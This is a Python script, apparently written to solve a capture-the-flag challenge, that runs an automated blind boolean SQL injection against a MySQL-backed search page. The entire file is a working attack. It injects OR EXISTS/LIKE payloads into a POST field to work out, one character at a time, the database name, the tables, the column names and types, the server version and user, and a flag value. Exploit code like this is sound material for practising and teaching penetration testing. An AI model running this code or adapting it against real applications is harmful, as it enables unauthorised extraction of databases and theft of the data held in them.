import requests

url = 'http://problems.getpwning.com:7007/search.php'
freq_alphabet = "etaoinsrhdlucmfywgpbvkxqjz0123456789._"
std_alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_ .()[]{\};'#:@~,./<>?!\\\"£$%^&*()+'"
numbers_alphabet = "0123456789.abcdefghijklmnopqrstuvwxyz_"
alphabet = std_alphabet

def checkSuccess(url, data):
    postData = {'bagel': data}
    r = requests.post(url, postData)
    return True if 'found!' in r.text else False

def escapeWildcards(chr):
    return "\\" + chr if chr in "_%'" else chr
        
def getDatabaseName():  #get the name of the current database
    string = ""
    length = 0

    for i in range(0,100):
        if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.SCHEMATA WHERE database() LIKE '{ '_' * i }%');-- "):
            length = i
            print(f"\rDatabase Name is '{'_' * i}' ", end="\r")
        else:
            break

    for i in range(0,length):
        for c in alphabet:
            print(f"\rDatabase Name is '{string + escapeWildcards(c)}{'_' * (length - len(string) - 1)}'", end="\r")
            if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.SCHEMATA WHERE database() LIKE '{ string + escapeWildcards(c) }%');-- "):
                string += c
                break
    print(f"Database Name is '{string}'")
    return string

def getTableNames(databaseName):
    
    count = 0
    names = []

    for i in range(0,100):
        print(f"\rDatabase '{databaseName}' has {i} tables. ", end="\r")

        if not checkSuccess(url, f"' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{databaseName}') > {i};-- "):
            count = i
            print(f"Database '{databaseName}' has {i} tables. ")
            break

    if count > 0:
        for t in range (1,count+1):
            print (f"Getting Table {t} Name...")
            names.append(getTableName(databaseName, t))

    print (f"Database {databaseName} contains tables {names}")
    return names

def getTableName(databaseName, ordinal = 1):
    string = ""
    length = 0

    for i in range(0,100):
        
        #if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME LIKE '{ '_' * i }%');-- "):
        if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{databaseName}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {ordinal - 1}) AS x WHERE TABLE_NAME LIKE '{ '_' * i }%');-- "):
            length = i
            print(f"\rTable Name is '{'_' * i}'", end="\r")
        else:
            break

    for i in range(0,length):
        for c in alphabet:
            print(f"\rTable Name is '{string + c}{'_' * (length - len(string) - 1)}'", end="\r") 
            if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{databaseName}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {ordinal - 1}) AS x WHERE TABLE_NAME LIKE '{ string + escapeWildcards(c) }%');-- "):
                string += c
                break
    print (f"Table Name is '{string}'")
    return string

def getColumns(databaseName, tableName):
    
    count = 0
    names = []
    types = []
    
    for i in range(0,100):
        print(f"\rTable '{tableName}' has {i} columns. ", end="\r")

        if not checkSuccess(url, f"' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}') > {i};-- "):
            count = i
            print(f"Table '{tableName}' has {i} columns. ")
            break

    if count > 0:
        for c in range (1,count+1):
            print (f"Getting Column {c} Details...")
            names.append(getColumnName(databaseName, tableName, c))
            types.append(getColumnType(databaseName, tableName, c))

    cols = list(zip(names, types))
    print (f"Table {databaseName}.{tableName} contains columns {cols}")
    return cols

def getColumnName(databaseName, tableName, ordinal):

    string = ""
    length = 0

    for i in range(0,100):
        if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}' AND ORDINAL_POSITION = {ordinal} AND COLUMN_NAME LIKE '{ '_' * i }%');-- "): 
            length = i
            print(f"\rColumn {ordinal} Name is '{'_' * i}'", end="\r")
        else:        
            break
    
    for i in range(0,length):
        for c in alphabet:
            print(f"\rColumn {ordinal} Name is '{string + c}{'_' * (length - len(string) - 1)}'", end="\r")
            if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}' AND ORDINAL_POSITION = {ordinal} AND COLUMN_NAME LIKE '{ string + escapeWildcards(c) }%');-- "):
                string += c
                break
    print(f"Column {ordinal} Name is '{string}'")
    return string

def getColumnType(databaseName, tableName, ordinal):
    for columnType in ["INTEGER","INT","CHAR","VARCHAR","DATETIME","FLOAT","REAL","DOUBLE","DECIMAL","BIGINT","MEDIUMINT","SMALLINT","TINYINT","NUMERIC","BIT","TIMESTAMP","DATE","TIME","YEAR","BINARY","VARBINARY","BLOB","TEXT","ENUM","SET","JSON","POINT","LINESTRING", "POLYGON", "MULTIPOINT", "MULTILINESTRING", "MULTIPOLYGON", "GEOMETRYCOLLECTION" ]:
        print(f"\rColumn {ordinal} Type is {columnType}              ", end="\r")
        if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{databaseName}' AND TABLE_NAME = '{tableName}' AND ORDINAL_POSITION = {ordinal} AND DATA_TYPE LIKE '{columnType}%');-- "):
            print(f"Column {ordinal} Type is {columnType}")
            return columnType

def columnContainsFlag(databaseName, tableName, columnName):
    if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM {databaseName}.{tableName} WHERE {columnName} LIKE 'CTF{{%}}');-- "):
        print(f"Column '{columnName}' contains a flag-like value")
        return True
    else:
        print(f"Column '{columnName}' contains no flag-like values")
        return False

def getFlag(databaseName, tableName, columnName):

    string = ""
    length = 0

    for i in range(0,100):
        
        if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM {databaseName}.{tableName} WHERE {columnName} LIKE 'CTF{{{ '_' * i }%}}');-- "): 
            length = i
            print(f"\rFlag is CTF{{{'_' * i}}}", end="\r")
        else:
            break

    for i in range(0,length):
        for c in alphabet:
            print(f"\rFlag is CTF{{{string + c}{'_' * (length - len(string) - 1)}}}", end="\r")
            
            if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM {databaseName}.{tableName} WHERE {columnName} LIKE 'CTF{{{ string + escapeWildcards(c) }%}}');-- "):
                string += c
                break
    print(f"Flag is CTF{{{string}}}")
    return f"CTF{{{string}}}"


def getMySqlValue(value, alphabet = alphabet):
    string = ""
    length = 0
    
    for i in range(0,100):
        if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM dual WHERE {value} LIKE '{ '_' * i }%');-- "):
            length = i
            print(f"\rMySQL '{value}' is '{'_' * i}' ", end="\r")
        else:
            break

    for i in range(0,length):
        for c in alphabet:
            print(f"\rMySQL '{value}' is '{string + c}{'_' * (length - len(string) - 1)}'", end="\r")
            if checkSuccess(url, f"' OR EXISTS(SELECT 1 FROM dual WHERE {value} LIKE '{ string + escapeWildcards(c) }%');-- "):
                string += c
                break
                
    print(f"MySQL '{value}' is '{string}'")
    return string

MySqlVersion = getMySqlValue("@@VERSION", alphabet = numbers_alphabet)
MySqlVersionComment = getMySqlValue("@@VERSION_COMMENT")
MySqlUser = getMySqlValue("USER()")
MySqlCurrentUser = getMySqlValue("CURRENT_USER()")

databaseName = getMySqlValue("DATABASE()")
for tableName in getTableNames(databaseName):
    for column in getColumns(databaseName, tableName):
        if columnContainsFlag(databaseName, tableName, column[0]):
            flag = getFlag(databaseName, tableName, column[0])
            exit()
